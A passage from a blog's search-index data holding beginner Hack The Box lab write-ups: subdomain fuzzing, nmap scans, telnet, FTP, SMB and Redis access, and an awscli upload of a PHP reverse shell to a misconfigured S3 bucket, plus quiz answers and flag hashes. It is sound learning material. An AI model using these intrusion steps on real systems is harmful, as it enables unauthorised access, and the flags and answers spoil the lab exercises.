feature.\ngobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z\nI tested several of the number outputs by adding them to /etc/hosts, but none of them worked. I then updated the wordlist to remove all of these inputs that contain numbers through a simple python script.\nsudo gobuster vhost -u http://thetoppers.htb -w subdomain_wl_no_numbers.txt -z -o gobuster.out\nThis only found the following subdomain (which failed after testing)\n1 Found: gc._msdcs Status: 400 [Size: 306] ffuf Next, I tried switching to ffuf as gobuster seemed to be failing me.\nffuf -c -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026quot;Host: FUZZ.thetopper.htb\u0026quot; -fc 200\nStill, no luck.\nAfter much trial and error, I ended up taking a look at the htb writeup for this challenge at this point. To my surprise, they simply run gobuster as I did, and find s3.thetoppers.htb\nEven after knowing the output, I spent much time testing ffuf and gobuster with no avail. I even tried text files only containing s3, but this was always missed by both tools. I even tried reseting the target machine and starting over, but this also failed. So, I\u0026rsquo;m going to chalk this up to something on HackTheBox\u0026rsquo;s end and continue pretending I found the s3 subdomain.\nDon\u0026rsquo;t forget to add s3.thetoppers.htb to /etc/hosts\nNOW, moving on\u0026hellip;\ns3 The Amazon S3 bucket (or s3 for short) is a cloud-based storage service which contains s3 objects. We can use the awscli (sudo apt install awscli) to try to interact with this bucket.\naws configure Then we can look at all the s3 buckets:\naws --endpoint=http://s3.thetoppers.htb s3 ls\nand all the objects in a bucket: aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb\nThere seems nothing of particular value in the bucket, but we can try and add a malicious php file and get a reverse shell. I typically take pentestmonkey\u0026rsquo;s template and change the $ip and port accordingly. To upload:\naws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb\nWe are in.\nLet\u0026rsquo;s search for the flag and be done 😁\nQuestions How many TCP ports are open? 2 What is the domain of the email address provided in the \u0026ldquo;Contact\u0026rdquo; section of the website? thetoppers.htb In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? /etc/hosts Which sub-domain is discovered during further enumeration? s3.thetoppers.htb Which service is running on the discovered sub-domain? Amazon s3 Which command line utility can be used to interact with the service running on the discovered sub-domain? awscli Which command is used to set up the AWS CLI installation? aws configure What is the command used by the above utility to list all of the S3 buckets? aws s3 ls This server is configured to run files written in what web scripting language? php flag: a980d99281a28d638ac68b9bf9453c2b\n","permalink":"https://woadey.lol/posts/tier1/","summary":"\u003cp\u003eShort writeups for each of the Starting Point boxes on HTB - Tier 1\u003c/p\u003e","title":"HTB: Learn the basics of Penetration Testing - Tier 1"},{"content":"Short writeups for each of the Starting Point boxes on HTB - Tier 0\nMeow nmap Starting the chall with an nmap scan to see which ports are open.\n1 2 3 4 5 6 7 8 9 # Nmap 7.92 scan initiated Fri Apr 29 15:39:25 2022 as: nmap -sV -sC -oA ./meow/meow 10.129.251.259 Nmap scan report for 10.129.251.259 Host is up (0.17s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 23/tcp open telnet? Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 29 15:40:00 2022 -- 1 IP address (1 host up) scanned in 35.35 seconds telnet telnet is an older and less secure network protocol that allows access to another device or server remotely. it happens to have an open port. Let\u0026rsquo;s try to connect.\nroot worked first try! ls; cat flag.txt to get the flag.\nQuestions What does the acronym VM stand for? Virtual Machine What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It\u0026rsquo;s also known as a console or shell. terminal What service do we use to form our VPN connection into HTB labs? openvpn What is the abbreviated name for a \u0026rsquo;tunnel interface\u0026rsquo; in the output of your VPN boot-up sequence output? tun What tool do we use to test our connection to the target with an ICMP echo request? ping What is the name of the most common tool for finding open ports on a target? nmap What service do we identify on port 23/tcp during our scans? telnet What username is able to log into the target over telnet with a blank password? root flag: b40abdfe23665f766f9c61ecba8a4c19\nFawn nmap Run nmap on the box.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # Nmap 7.92 scan initiated Fri Apr 29 15:48:32 2022 as: nmap -sV -sC -oA nmap/fawn 10.129.143.56 Nmap scan report for 10.129.143.56 Host is up (0.088s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.16.162 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 29 15:48:37 2022 -- 1 IP address (1 host up) scanned in 4.99 seconds FTP ftp (File Transfer Protocol) allows devices to upload, download and transfer files through the internet. However, this can be taken advantage of if configured poorly.\nLet\u0026rsquo;s connect via: ftp 10.129.143.56 and sign in as an anonymous user. Bingo, now just find the flag.\nQuestions What does the 3-letter acronym FTP stand for? File Transfer Protocol Which port does the FTP service listen on usually? 21 What acronym is used for the secure version of FTP? SFTP What is the command we can use to send an ICMP echo request to test our connection to the target? ping From your scans, what version is FTP running on the target? vsftpd 3.0.3 From your scans, what OS type is running on the target? Unix What is the command we need to run in order to display the \u0026lsquo;ftp\u0026rsquo; client help menu? ftp -h What is username that is used over FTP when you want to log in without having an account? anonymous What is the response code we get for the FTP message \u0026lsquo;Login successful\u0026rsquo;? 230 There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system. ls What is the command used to download the file we found on the FTP server? get flag: 035db21c881520061c53e0536e44f815\nDancing nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # Nmap 7.92 scan initiated Fri Apr 29 15:57:22 2022 as: nmap -sV -sC -oA nmap/dancing 10.129.24.249 Nmap scan report for 10.129.24.249 Host is up (0.075s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-04-30T00:00:27 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required |_clock-skew: 3h59m59s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 29 16:00:33 2022 -- 1 IP address (1 host up) scanned in 191.84 seconds smb smb (Server Message Block) is a network protocol that allows devices to share, open, and edit files on remote devices or servers. smbclient is a tool to harness this protocol.\nWe can list all the smb sharenames by smbclient -L 10.129.24.249. Now let\u0026rsquo;s try to connect to all of them via smbclient \\\\\\\\10.129.24.249\\\\\u0026lt;Sharename\u0026gt;\nWorkShares ftw! Now let\u0026rsquo;s look around and get the flag.\nQuestions What does the 3-letter acronym SMB stand for? Server Message Block What port does SMB use to operate at? 445 What is the service name for port 445 that came up in our Nmap scan? microsoft-ds What is the \u0026lsquo;flag\u0026rsquo; or \u0026lsquo;switch\u0026rsquo; we can use with the SMB tool to \u0026rsquo;list\u0026rsquo; the contents of the share? -L How many shares are there on Dancing? 4 What is the name of the share we are able to access in the end with a blank password? WorkShares What is the command we can use within the SMB shell to download the files we find? get flag: 5f61c10dffbc77a704d76016a22f1664\nRedeemer nmap 1 2 3 4 5 6 7 8 9 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 21:34 EDT Nmap scan report for 10.129.13.221 Host is up (0.069s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 6379/tcp open redis Redis key-value store 5.0.7 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 724.57 seconds redis redis (Remote Dictionary Server) is an in-memory data structure that can be used as a database, cache, or message broker. We can use redis-cli (sudo apt install redis-tools) to interact with the server:\nredis-cli -h 10.129.13.221 followed by info will give us some insight into the stored data. select 0 will allow us to select the database, and keys * will show all keys in the db. Profit!\nQuestions Which TCP port is open on the machine? 6379 Which service is running on the port that is open on the machine? redis What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database In-memory Database Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments. redis-cli Which flag is used with the Redis command-line utility to specify the hostname? -h Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? info What is the version of the Redis server being used on the target machine? 5.0.7 Which command is used to select the desired database in Redis? select How many keys are present inside the database with index 0? 4 Which command is used to obtain all the keys in a database? keys * flag: 03e1d2b376c37ab3f5319922053953eb\n","permalink":"https://woadey.lol/posts/tier0/","summary":"\u003cp\u003eShort writeups for each of the Starting Point boxes on HTB - Tier 0\u003c/p\u003e","title":"HTB: Learn the basics of Penetration Testing - Tier 0"}]